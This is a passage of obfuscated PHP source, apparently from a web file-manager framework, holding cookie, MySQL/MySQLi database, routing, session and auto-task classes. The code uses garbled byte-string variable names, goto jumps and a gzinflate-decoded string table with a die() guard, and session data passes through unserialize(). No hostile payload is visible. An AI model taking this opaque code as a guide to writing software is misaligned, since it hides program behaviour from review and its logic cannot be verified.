330\313\267\0\0".base64_decode('').strrev('').base64_decode('')."", 10, -8))); goto B” ÑŒ¯·›; e‚±ØîŠÅ‘: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ïòö´ìë = '', $ÃÃ–¤Î = 0) { if (is_string($ïòö´ìë) && $ïòö´ìë != $_SERVER[º·Ï‹¥³][12]) { $this->prefix = $ïòö´ìë; } if (is_numeric($ÃÃ–¤Î) && $ÃÃ–¤Î > 0) { $this->expire = $ÃÃ–¤Î; } } public static function getInstance() { static $µ‹ŞÄš; if ($µ‹ŞÄš === null) { $µ‹ŞÄš = new self(); } return $µ‹ŞÄš; } private static $cookieDisable = false; public static function disable($àÀ¹ïë‘) { self::$cookieDisable = $àÀ¹ïë‘; } private static $sameCookieSet = array(); public static function set($óÉâÆäÀ, $ÌÓ¼Şİ–, $ÍÂä­šØ = 0, $ùüè³Ë½ = false, $ˆ·À˜Œ¸ = false) { $Şü§ñ¢Š =& $_SERVER[º·Ï‹¥³]; if (self::$cookieDisable) { return; } if (!$ÍÂä­šØ) { $ÍÂä­šØ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$óÉâÆäÀ]) && self::$sameCookieSet[$óÉâÆäÀ] == $ÌÓ¼Şİ– . $ÍÂä­šØ) { return; } self::$sameCookieSet[$óÉâÆäÀ] = $ÌÓ¼Şİ– . $ÍÂä­šØ; if (!$ˆ·À˜Œ¸) { $ˆ·À˜Œ¸ = str_replace(HOST, $Şü§ñ¢Š[12], APP_HOST); $ˆ·À˜Œ¸ = _get($GLOBALS, $Şü§ñ¢Š[931], $ˆ·À˜Œ¸); } $Š¿±ÁÎÒ = $Şü§ñ¢Š[12]; setcookie($óÉâÆäÀ, $ÌÓ¼Şİ–, time() + $ÍÂä­šØ, $Şü§ñ¢Š[8] . trim($ˆ·À˜Œ¸, $Şü§ñ¢Š[8]) . $Š¿±ÁÎÒ, !1, !1, $ùüè³Ë½); } public static function setSafe($¶ß»åü”, $£ã¶æ´İ, $Í¡êÈ¢ = 0) { self::set($¶ß»åü”, $£ã¶æ´İ, $Í¡êÈ¢, !0); } public static function get($Üù·µ…) { static $¸˜¦Ü°Û = false; if (!$¸˜¦Ü°Û) { self::initHeaderCookie(); $¸˜¦Ü°Û = !0; } return isset($_COOKIE[$Üù·µ…]) ? $_COOKIE[$Üù·µ…] : !1; } private static function initHeaderCookie() { $ïóãÇÎÏ =& $_SERVER[º·Ï‹¥³]; if (!isset($_SERVER[$ïóãÇÎÏ[932]]) || !$_SERVER[$ïóãÇÎÏ[932]]) { return; } $ßŞ¦ÌŒå = explode($ïóãÇÎÏ[74], $_SERVER[$ïóãÇÎÏ[932]]); foreach ($ßŞ¦ÌŒå as $¾Ñ¸ãé†) { $¾Ñ¸ãé† = explode($ïóãÇÎÏ[933], $¾Ñ¸ãé†); if (count($¾Ñ¸ãé†) != 2 || !isset($¾Ñ¸ãé†[1])) { continue; } $_COOKIE[trim($¾Ñ¸ãé†[0])] = trim($¾Ñ¸ãé†[1]); } } public static function remove($—öç¸š , $ÓÄ³±›Ã = false) { unset($_COOKIE[$—öç¸š ]); self::set($—öç¸š , $_SERVER[º·Ï‹¥³][12], 1, $ÓÄ³±›Ã); } } class DbMysql extends Db { public function __construct($Œ¤ƒ±ƒç = '') { $¯ÄŒ³áß =& $_SERVER[º·Ï‹¥³]; if (!extension_loaded($¯ÄŒ³áß[855])) { think_exception(think_lang($¯ÄŒ³áß[14]) . $¯ÄŒ³áß[934]); } if (!empty($Œ¤ƒ±ƒç)) { $this->config = $Œ¤ƒ±ƒç; if (empty($this->config[$¯ÄŒ³áß[17]])) { $this->config[$¯ÄŒ³áß[17]] = $¯ÄŒ³áß[12]; } } } public function connect($ëˆÀò¨ = '', $óÀ¡¸É = 0, $Î¿ö¹¶ = false) { $ÈÎ¼úô­ =& $_SERVER[º·Ï‹¥³]; if (!isset($this->linkID[$óÀ¡¸É])) { if (empty($ëˆÀò¨)) { $ëˆÀò¨ = $this->config; } $Ñ—÷ï = $ëˆÀò¨[$ÈÎ¼úô­[935]] . ($ëˆÀò¨[$ÈÎ¼úô­[936]] ? "\x3a{$ëˆÀò¨[$ÈÎ¼úô­[936]]}" : $ÈÎ¼úô­[12]); $òÉû—ì = !empty($ëˆÀò¨[$ÈÎ¼úô­[17]][$ÈÎ¼úô­[18]]) ? $ëˆÀò¨[$ÈÎ¼úô­[17]][$ÈÎ¼úô­[18]] : $this->pconnect; if ($òÉû—ì) { $this->linkID[$óÀ¡¸É] = mysql_pconnect($Ñ—÷ï, $ëˆÀò¨[$ÈÎ¼úô­[937]], $ëˆÀò¨[$ÈÎ¼úô­[938]], 131072); } else { $this->linkID[$óÀ¡¸É] = mysql_connect($Ñ—÷ï, $ëˆÀò¨[$ÈÎ¼úô­[937]], $ëˆÀò¨[$ÈÎ¼úô­[938]], !0, 131072); } if (!$this->linkID[$óÀ¡¸É] || !empty($ëˆÀò¨[$ÈÎ¼úô­[21]]) && !mysql_select_db($ëˆÀò¨[$ÈÎ¼úô­[21]], $this->linkID[$óÀ¡¸É])) { think_exception(mysql_error()); } $Ó¨ÅÑØÁ = mysql_get_server_info($this->linkID[$óÀ¡¸É]); mysql_query($ÈÎ¼úô­[939] . think_config($ÈÎ¼úô­[940]) . $ÈÎ¼úô­[58], $this->linkID[$óÀ¡¸É]); if ($Ó¨ÅÑØÁ > $ÈÎ¼úô­[941]) { mysql_query($ÈÎ¼úô­[942], $this->linkID[$óÀ¡¸É]); } $this->connected = !0; if (1 != think_config($ÈÎ¼úô­[22])) { unset($this->config); } } return $this->linkID[$óÀ¡¸É]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($åÌ÷·Ñ¥) { $±ÏÖŒ¼ë =& $_SERVER[º·Ï‹¥³]; if (0 === stripos($åÌ÷·Ñ¥, $±ÏÖŒ¼ë[316])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $åÌ÷·Ñ¥; if ($this->queryID) { $this->free(); } think_action_status($±ÏÖŒ¼ë[23], 1); think_status($±ÏÖŒ¼ë[24]); $this->queryID = mysql_query($åÌ÷·Ñ¥, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($©ôôŞ–™) { $·ÊˆÈÕ¤ =& $_SERVER[º·Ï‹¥³]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©ôôŞ–™; if ($this->queryID) { $this->free(); } think_action_status($·ÊˆÈÕ¤[25], 1); think_status($·ÊˆÈÕ¤[24]); $ö‘ç‹¹¿ = mysql_query($©ôôŞ–™, $this->_linkID); $this->debug(); if (!1 === $ö‘ç‹¹¿) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[º·Ï‹¥³][943], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Œâƒ‹±ï = mysql_query($_SERVER[º·Ï‹¥³][944], $this->_linkID); $this->transTimes = 0; if (!$Œâƒ‹±ï) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $·¡ä›‰ = mysql_query($_SERVER[º·Ï‹¥³][945], $this->_linkID); $this->transTimes = 0; if (!$·¡ä›‰) { $this->error(); return !1; } } return !0; } private function getAll() { $È—¯¡¦ù = array(); if ($this->numRows > 0) { while ($ıïØ„Ş« = mysql_fetch_assoc($this->queryID)) { $È—¯¡¦ù[] = $ıïØ„Ş«; } mysql_data_seek($this->queryID, 0); } return $È—¯¡¦ù; } public function getFields($ÇƒùùÕª) { $çŠÜşî =& $_SERVER[º·Ï‹¥³]; $û©áÉ¯§ = $this->query($çŠÜşî[946] . $this->parseKey($ÇƒùùÕª)); $Æ®³²éÄ = array(); if ($û©áÉ¯§) { foreach ($û©áÉ¯§ as $ıÃÚµÈÆ => $Çç¤”) { $Æ®³²éÄ[$Çç¤”[$çŠÜşî[31]]] = array($çŠÜşî[32] => $Çç¤”[$çŠÜşî[31]], $çŠÜşî[33] => $Çç¤”[$çŠÜşî[34]], $çŠÜşî[35] => (bool) (strtoupper($Çç¤”[$çŠÜşî[36]]) === $çŠÜşî[947]), $çŠÜşî[37] => $Çç¤”[$çŠÜşî[38]], $çŠÜşî[39] => strtolower($Çç¤”[$çŠÜşî[40]]) == $çŠÜşî[41], $çŠÜşî[42] => strtolower($Çç¤”[$çŠÜşî[43]]) == $çŠÜşî[44]); } } return $Æ®³²éÄ; } public function getTables($“½¸œËĞ = '') { $¨â“Ëçˆ =& $_SERVER[º·Ï‹¥³]; if (!empty($“½¸œËĞ)) { $„Êç™äª = $¨â“Ëçˆ[948] . $“½¸œËĞ . $¨â“Ëçˆ[949]; } else { $„Êç™äª = $¨â“Ëçˆ[950]; } $„©ƒãêØ = $this->query($„Êç™äª); $øÖõŒ½ = array(); foreach ($„©ƒãêØ as $ı¢Æ˜¸û => $Üõ¢÷®) { $øÖõŒ½[$ı¢Æ˜¸û] = current($Üõ¢÷®); } return $øÖõŒ½; } public function replace($äÔÑÙ«, $©Œå´¿ğ = array()) { $‚õ–Ó™á =& $_SERVER[º·Ï‹¥³]; foreach ($äÔÑÙ« as $ê¬ÙÛ–¡ => $ğ¨­°˜°) { $èÉñßÑ = $this->parseValue($ğ¨­°˜°); if (is_scalar($èÉñßÑ)) { $—¦º£–[] = $èÉñßÑ; $§ÅÇÉÒÒ[] = $this->parseKey($ê¬ÙÛ–¡); } } $Ã§˜à¶ = $‚õ–Ó™á[951] . $this->parseTable($©Œå´¿ğ[$‚õ–Ó™á[331]]) . $‚õ–Ó™á[952] . implode($‚õ–Ó™á[50], $§ÅÇÉÒÒ) . $‚õ–Ó™á[953] . implode($‚õ–Ó™á[50], $—¦º£–) . $‚õ–Ó™á[954]; return $this->execute($Ã§˜à¶); } public function insertAll($û÷¨¾ƒ, $öäÀ«ºÓ = array(), $ÛÃ“°¹Ú = false) { $¢ö£ê¦î =& $_SERVER[º·Ï‹¥³]; if (!is_array($û÷¨¾ƒ[0])) { return !1; } $¸‚Ş°Æµ = array_keys($û÷¨¾ƒ[0]); $×‡ç³˜ = array(); foreach ($û÷¨¾ƒ as $·µ°ÍòÓ) { $¡Ğ©Û•ë = array(); foreach ($·µ°ÍòÓ as $œİ¨îœµ => $ìÆàšö) { $ìÆàšö = $this->parseValue($ìÆàšö); if (is_scalar($ìÆàšö)) { $¡Ğ©Û•ë[] = $ìÆàšö; } } $×‡ç³˜[] = $¢ö£ê¦î[312] . implode($¢ö£ê¦î[50], $¡Ğ©Û•ë) . $¢ö£ê¦î[954]; } array_walk($¸‚Ş°Æµ, array($this, $¢ö£ê¦î[955])); $Œ•ëĞŞ = ($ÛÃ“°¹Ú ? $¢ö£ê¦î[956] : $¢ö£ê¦î[957]) . $¢ö£ê¦î[958] . $this->parseTable($öäÀ«ºÓ[$¢ö£ê¦î[331]]) . $¢ö£ê¦î[952] . implode($¢ö£ê¦î[50], $¸‚Ş°Æµ) . $¢ö£ê¦î[959] . implode($¢ö£ê¦î[50], $×‡ç³˜); return $this->execute($Œ•ëĞŞ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $…Ù«í—˜ =& $_SERVER[º·Ï‹¥³]; $this->error = mysql_errno() . $…Ù«í—˜[4] . mysql_error($this->_linkID); if ($…Ù«í—˜[12] != $this->queryStr) { $this->error .= LNG($…Ù«í—˜[48]) . $this->queryStr; } think_trace($this->error, $…Ù«í—˜[12], $…Ù«í—˜[49]); return $this->error; } public function escapeString($ØéÉ…‘ë) { if ($this->_linkID) { return mysql_real_escape_string($ØéÉ…‘ë, $this->_linkID); } else { return mysql_escape_string($ØéÉ…‘ë); } } public function parseKey(&$ÌØö‰ã¥, $â‡ÇÃÒñ = true) { $º£ºë£– =& $_SERVER[º·Ï‹¥³]; if ($â‡ÇÃÒñ) { $ÌØö‰ã¥ = $this->parseKeyCheck($ÌØö‰ã¥); } if ($ÌØö‰ã¥ != $º£ºë£–[211] && !preg_match($º£ºë£–[960], $ÌØö‰ã¥)) { $ÌØö‰ã¥ = $º£ºë£–[445] . trim($ÌØö‰ã¥, $º£ºë£–[445]) . $º£ºë£–[445]; } return $ÌØö‰ã¥; } } class DbMysqli extends Db { public function __construct($Á›Ó¥†Ô = '') { $¾İá˜—‹ =& $_SERVER[º·Ï‹¥³]; if (!extension_loaded($¾İá˜—‹[961])) { think_exception(think_lang($¾İá˜—‹[14]) . $¾İá˜—‹[962]); } if (!empty($Á›Ó¥†Ô)) { $this->config = $Á›Ó¥†Ô; if (empty($this->config[$¾İá˜—‹[17]])) { $this->config[$¾İá˜—‹[17]] = $¾İá˜—‹[12]; } } } public function connect($™óµÎİØ = '', $¸åŞÀ·î = 0) { $Ï•»½€Å =& $_SERVER[º·Ï‹¥³]; if (!isset($this->linkID[$¸åŞÀ·î])) { if (empty($™óµÎİØ)) { $™óµÎİØ = $this->config; } $this->linkID[$¸åŞÀ·î] = new mysqli($™óµÎİØ[$Ï•»½€Å[935]], $™óµÎİØ[$Ï•»½€Å[937]], $™óµÎİØ[$Ï•»½€Å[938]], $™óµÎİØ[$Ï•»½€Å[21]], $™óµÎİØ[$Ï•»½€Å[936]] ? intval($™óµÎİØ[$Ï•»½€Å[936]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Šƒ¼ù¤ = $this->linkID[$¸åŞÀ·î]->server_version; $this->linkID[$¸åŞÀ·î]->query($Ï•»½€Å[939] . think_config($Ï•»½€Å[940]) . $Ï•»½€Å[58]); if ($Šƒ¼ù¤ > $Ï•»½€Å[941]) { $this->linkID[$¸åŞÀ·î]->query($Ï•»½€Å[942]); } $this->connected = !0; if (1 != think_config($Ï•»½€Å[22])) { unset($this->config); } } return $this->linkID[$¸åŞÀ·î]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($äÁéùÖğ) { $ŒºÃ¿¬› =& $_SERVER[º·Ï‹¥³]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $äÁéùÖğ; if ($this->queryID) { $this->free(); } think_action_status($ŒºÃ¿¬›[23], 1); think_status($ŒºÃ¿¬›[24]); $this->queryID = $this->_linkID->query($äÁéùÖğ); if ($this->_linkID->more_results()) { while (($Ãáğè«ğ = $this->_linkID->next_result()) != NULL) { $Ãáğè«ğ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($²€â›ÉØ) { $š‚Æ–¿— =& $_SERVER[º·Ï‹¥³]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $²€â›ÉØ; if ($this->queryID) { $this->free(); } think_action_status($š‚Æ–¿—[25], 1); think_status($š‚Æ–¿—[24]); $ÅŸ¢ŸÕŞ = $this->_linkID->query($²€â›ÉØ); $this->debug(); if (!1 === $ÅŸ¢ŸÕŞ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $§é©Ñõ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$§é©Ñõ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÜúÎİ¬¥ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÜúÎİ¬¥) { $this->error(); return !1; } } return !0; } private function getAll() { $ÆÅìÒÏ¯ = array(); if ($this->numRows > 0) { for ($¶à¸¤Úø = 0; $¶à¸¤Úø < $this->numRows; $¶à¸¤Úø++) { $ÆÅìÒÏ¯[$¶à¸¤Úø] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÆÅìÒÏ¯; } public function getFields($î§çâ˜à) { $íåù±†¦ =& $_SERVER[º·Ï‹¥³]; $ÌôÀºá‘ = $this->query($íåù±†¦[946] . $this->parseKey($î§çâ˜à)); $¬ÆèòÖÔ = array(); if ($ÌôÀºá‘) { foreach ($ÌôÀºá‘ as $üÎŠ³úò => $ÌÙ“Äú«) { $¬ÆèòÖÔ[$ÌÙ“Äú«[$íåù±†¦[31]]] = array($íåù±†¦[32] => $ÌÙ“Äú«[$íåù±†¦[31]], $íåù±†¦[33] => $ÌÙ“Äú«[$íåù±†¦[34]], $íåù±†¦[35] => (bool) ($ÌÙ“Äú«[$íåù±†¦[36]] === $íåù±†¦[12]), $íåù±†¦[37] => $ÌÙ“Äú«[$íåù±†¦[38]], $íåù±†¦[39] => strtolower($ÌÙ“Äú«[$íåù±†¦[40]]) == $íåù±†¦[41], $íåù±†¦[42] => strtolower($ÌÙ“Äú«[$íåù±†¦[43]]) == $íåù±†¦[44]); } } return $¬ÆèòÖÔ; } public function getTables($¡·¨ñ  = '') { $º¾ÎŞñã =& $_SERVER[º·Ï‹¥³]; $ú‚ …ÔÛ = !empty($¡·¨ñ ) ? $º¾ÎŞñã[948] . $¡·¨ñ  . $º¾ÎŞñã[949] : $º¾ÎŞñã[950]; $ˆÑ¤–“Ö = $this->query($ú‚ …ÔÛ); $‰Ê±Ê­æ = array(); if ($ˆÑ¤–“Ö) { foreach ($ˆÑ¤–“Ö as $ ·—À£® => $‡Ã¡òÑË) { $‰Ê±Ê­æ[$ ·—À£®] = current($‡Ã¡òÑË); } } return $‰Ê±Ê­æ; } public function replace($³ŞùÏó, $ˆóíå·ì = array()) { $ß™ÏßßÔ =& $_SERVER[º·Ï‹¥³]; foreach ($³ŞùÏó as $Çü‰¾˜´ => $Ìüİ‹ ’) { $À¼ÅÚÖí = $this->parseValue($Ìüİ‹ ’); if (is_scalar($À¼ÅÚÖí)) { $Åñ†¹††[] = $À¼ÅÚÖí; $şáîåğâ[] = $this->parseKey($Çü‰¾˜´); } } $¦±öşÄë = $ß™ÏßßÔ[951] . $this->parseTable($ˆóíå·ì[$ß™ÏßßÔ[331]]) . $ß™ÏßßÔ[952] . implode($ß™ÏßßÔ[50], $şáîåğâ) . $ß™ÏßßÔ[953] . implode($ß™ÏßßÔ[50], $Åñ†¹††) . $ß™ÏßßÔ[954]; return $this->execute($¦±öşÄë); } public function insertAll($Åä¼Ù™º, $Øà¡ºª = array(), $ˆ–‹Û†¼ = false) { $¼º©»û =& $_SERVER[º·Ï‹¥³]; if (!is_array($Åä¼Ù™º[0])) { return !1; } $—²”öüş = array_keys($Åä¼Ù™º[0]); $÷ñ›áê = array(); foreach ($Åä¼Ù™º as $ÃÄæåºØ) { $Ò˜‰¤ó„ = array(); foreach ($ÃÄæåºØ as $Ñò­Îº© => $¦ßŒÓÛü) { $¦ßŒÓÛü = $this->parseValue($¦ßŒÓÛü); if (is_scalar($¦ßŒÓÛü)) { $Ò˜‰¤ó„[] = $¦ßŒÓÛü; } } $÷ñ›áê[] = $¼º©»û[312] . implode($¼º©»û[50], $Ò˜‰¤ó„) . $¼º©»û[954]; } array_walk($—²”öüş, array($this, $¼º©»û[955])); $¨’Ùíùğ = $ˆ–‹Û†¼ ? $¼º©»û[956] : $¼º©»û[957]; $‚ô€‚…Ò = $¨’Ùíùğ . $¼º©»û[958] . $this->parseTable($Øà¡ºª[$¼º©»û[331]]) . $¼º©»û[952] . implode($¼º©»û[50], $—²”öüş) . $¼º©»û[959] . implode($¼º©»û[50], $÷ñ›áê); return $this->execute($‚ô€‚…Ò); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ùÚ¿Õª× =& $_SERVER[º·Ï‹¥³]; $this->error = $this->_linkID->errno . $ùÚ¿Õª×[4] . $this->_linkID->error; if ($ùÚ¿Õª×[12] != $this->queryStr) { $this->error .= LNG($ùÚ¿Õª×[48]) . $this->queryStr; } think_trace($this->error, $ùÚ¿Õª×[12], $ùÚ¿Õª×[49]); return $this->error; } public function escapeString($œªïêÌ¬) { if ($this->_linkID) { return $this->_linkID->real_escape_string($œªïêÌ¬); } else { return addslashes($œªïêÌ¬); } } public function parseKey(&$‹’åÒâ§, $è±ªŠÒ™ = true) { $¦ıÇë« =& $_SERVER[º·Ï‹¥³]; if ($è±ªŠÒ™) { $‹’åÒâ§ = $this->parseKeyCheck($‹’åÒâ§); } if ($‹’åÒâ§ != $¦ıÇë«[211] && !preg_match($¦ıÇë«[960], $‹’åÒâ§)) { $‹’åÒâ§ = $¦ıÇë«[445] . trim($‹’åÒâ§, $¦ıÇë«[445]) . $¦ıÇë«[445]; } return $‹’åÒâ§; } } goto a¨ñ²‰ Öô; d¸áˆ¸ˆõ¶: $_SERVER[€ÔÇñ¨ø] = explode($_SERVER[º·Ï‹¥³][664], gzinflate(substr($_SERVER[º·Ï‹¥³][665], 10, -8))); $yaejlkpuiz = $_SERVER[º·Ï‹¥³][666]; if (strlen($yaejlkpuiz) < $_SERVER[º·Ï‹¥³][412]) { die; } goto F»‡¤°•æÚ; dË¿å¾Ùï˜: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\x5b\x5e\57\x5d\x2b", "\x3a\x6e\165\x6d" => "\x5b\60\55\71\x5d\x2b", "\x3a\x61\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($İÜµ†ÁÑ, $ÁıÎ—¿û) { $ßİè‹Óñ =& $_SERVER[º·Ï‹¥³]; if ($İÜµ†ÁÑ == $ßİè‹Óñ[1690]) { $°´Øçòá = array_map($ßİè‹Óñ[1691], $ÁıÎ—¿û[0]); $’’Ôí™Ğ = strpos($ÁıÎ—¿û[1], $ßİè‹Óñ[8]) === 0 ? $ÁıÎ—¿û[1] : $ßİè‹Óñ[8] . $ÁıÎ—¿û[1]; $‘¯øé¸ = $ÁıÎ—¿û[2]; } else { $°´Øçòá = null; $’’Ôí™Ğ = strpos($ÁıÎ—¿û[0], $ßİè‹Óñ[8]) === 0 ? $ÁıÎ—¿û[0] : $ßİè‹Óñ[8] . $ÁıÎ—¿û[0]; $‘¯øé¸ = $ÁıÎ—¿û[1]; } array_push(self::$maps, $°´Øçòá); array_push(self::$routes, $’’Ôí™Ğ); array_push(self::$methods, strtoupper($İÜµ†ÁÑ)); array_push(self::$callbacks, $‘¯øé¸); } public static function error($ı›Áôï³) { self::$errorCallback = $ı›Áôï³; } public static function haltOnMatch($´ïãÂÖ½ = true) { self::$halts = $´ïãÂÖ½; } public static function dispatch() { $ß²õÉšÚ =& $_SERVER[º·Ï‹¥³]; $İã¦ÄÂÅ = parse_url($_SERVER[$ß²õÉšÚ[1692]], PHP_URL_PATH); $ÀÛ­Üëº = $_SERVER[$ß²õÉšÚ[163]]; $ü”õè½³ = array_keys(static::$patterns); $Ã‡şù¤Ç = array_values(static::$patterns); $¦Ô¤ø  = !1; self::$routes = preg_replace($ß²õÉšÚ[1329], $ß²õÉšÚ[8], self::$routes); if (in_array($İã¦ÄÂÅ, self::$routes)) { $µ÷€Î–Û = array_keys(self::$routes, $İã¦ÄÂÅ); foreach ($µ÷€Î–Û as $«¥•õ€¿) { if (self::$methods[$«¥•õ€¿] == $ÀÛ­Üëº || self::$methods[$«¥•õ€¿] == $ß²õÉšÚ[1693] || in_array($ÀÛ­Üëº, self::$maps[$«¥•õ€¿])) { $¦Ô¤ø  = !0; if (!is_object(self::$callbacks[$«¥•õ€¿])) { $ã‚¥Š¬ = explode($ß²õÉšÚ[8], self::$callbacks[$«¥•õ€¿]); $Éëóˆ‚² = end($ã‚¥Š¬); $Òöâ¿‚é = explode($ß²õÉšÚ[1261], $Éëóˆ‚²); $åÆ²ú† = new $Òöâ¿‚é[0](); $åÆ²ú†->{$Òöâ¿‚é[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$«¥•õ€¿]); if (self::$halts) { return; } } } } } else { $ˆöî¥Âæ = 0; foreach (self::$routes as $«¥•õ€¿) { if (strpos($«¥•õ€¿, $ß²õÉšÚ[4]) !== !1) { $«¥•õ€¿ = str_replace($ü”õè½³, $Ã‡şù¤Ç, $«¥•õ€¿); } if (preg_match($ß²õÉšÚ[1694] . $«¥•õ€¿ . $ß²õÉšÚ[1695], $İã¦ÄÂÅ, $»ö¦ß)) { if (self::$methods[$ˆöî¥Âæ] == $ÀÛ­Üëº || self::$methods[$ˆöî¥Âæ] == $ß²õÉšÚ[1693] || !empty(self::$maps[$ˆöî¥Âæ]) && in_array($ÀÛ­Üëº, self::$maps[$ˆöî¥Âæ])) { $¦Ô¤ø  = !0; array_shift($»ö¦ß); if (!is_object(self::$callbacks[$ˆöî¥Âæ])) { $ã‚¥Š¬ = explode($ß²õÉšÚ[8], self::$callbacks[$ˆöî¥Âæ]); $Éëóˆ‚² = end($ã‚¥Š¬); $Òöâ¿‚é = explode($ß²õÉšÚ[1261], $Éëóˆ‚²); $åÆ²ú† = new $Òöâ¿‚é[0](); if (!method_exists($åÆ²ú†, $Òöâ¿‚é[1])) { echo $ß²õÉšÚ[1696]; } else { call_user_func_array(array($åÆ²ú†, $Òöâ¿‚é[1]), $»ö¦ß); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ˆöî¥Âæ], $»ö¦ß); if (self::$halts) { return; } } } } $ˆöî¥Âæ++; } } if ($¦Ô¤ø  == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÅŠÎÂñ¾ =& $_SERVER[º·Ï‹¥³]; header($_SERVER[$ÅŠÎÂñ¾[1697]] . $ÅŠÎÂñ¾[1698]); echo $ÅŠÎÂñ¾[1699]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ß²õÉšÚ[1692]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $îÕé–¾— =& $_SERVER[º·Ï‹¥³]; static $ß“¨ÆÒ = false; if ($ß“¨ÆÒ) { return $ß“¨ÆÒ; } $æ¤ıÊéå = $GLOBALS[$îÕé–¾—[6]][$îÕé–¾—[400]]; self::$sessionTime = $æ¤ıÊéå[$îÕé–¾—[1700]]; $‡Ş•ö¼ = isset($GLOBALS[$îÕé–¾—[1701]]) ? $GLOBALS[$îÕé–¾—[1701]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($‡Ş•ö¼)) { self::$sessionSign = Cookie::get($‡Ş•ö¼); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($‡Ş•ö¼, self::$sessionSign, self::$sessionTime); $ˆ‹ïòò• = $æ¤ıÊéå[$îÕé–¾—[1702]]; $Ô½İ¸Õ¼ = $æ¤ıÊéå[$ˆ‹ïòò•]; $ÕçØ´Ó = $æ¤ıÊéå[$îÕé–¾—[879]]; switch ($ˆ‹ïòò•) { case $îÕé–¾—[21]: self::$handle = Model($îÕé–¾—[880]); break; case $îÕé–¾—[881]: self::$handle = new CacheRedis($Ô½İ¸Õ¼, $ÕçØ´Ó); break; case $îÕé–¾—[882]: self::$handle = new CacheMemcached($Ô½İ¸Õ¼, $ÕçØ´Ó); break; case $îÕé–¾—[221]: $Ô½İ¸Õ¼[$îÕé–¾—[87]] = $Ô½İ¸Õ¼[$îÕé–¾—[87]] . $îÕé–¾—[1703]; self::$handle = new CacheFile($Ô½İ¸Õ¼, $ÕçØ´Ó); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ß“¨ÆÒ = new self(); return $ß“¨ÆÒ; } public static function getBySign($ÁÍ²ø¢ï) { $èÈÊ¯µï = self::$handle->get($ÁÍ²ø¢ï); $èÈÊ¯µï = unserialize($èÈÊ¯µï); return is_array($èÈÊ¯µï) ? $èÈÊ¯µï : array(); } public static function setBySign($ıäû‹¡ø, $ûİÄ¸†Ö) { CacheLock::lock($ıäû‹¡ø); self::$handle->set($ıäû‹¡ø, serialize($ûİÄ¸†Ö), self::$sessionTime); CacheLock::unlock($ıäû‹¡ø); } public static function sign($çÉËò·Š = false) { if ($çÉËò·Š) { self::$sessionSign = $çÉËò·Š; } self::init(); return self::$sessionSign; } public static function set($¤ÍæéÄ, $Ü¼‘¼‹¥ = false) { self::init(); if (is_array($¤ÍæéÄ)) { foreach ($¤ÍæéÄ as $š„­êÈì => $õëÁ“ÀÂ) { array_set_value(self::$data, $š„­êÈì, $õëÁ“ÀÂ); } } else { array_set_value(self::$data, $¤ÍæéÄ, $Ü¼‘¼‹¥); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Œ²İô×“ = false) { self::init(); if (!$Œ²İô×“) { return self::$data; } return array_get_value(self::$data, $Œ²İô×“); } public static function remove($´£–ºŒ¸) { self::init(); unset(self::$data[$´£–ºŒ¸]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[º·Ï‹¥³][885])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $½ÔÊÃä­ =& $_SERVER[º·Ï‹¥³]; if (self::valueGet($½ÔÊÃä­[802]) != $½ÔÊÃä­[91]) { return; } if (self::valueGet($½ÔÊÃä­[1704]) == 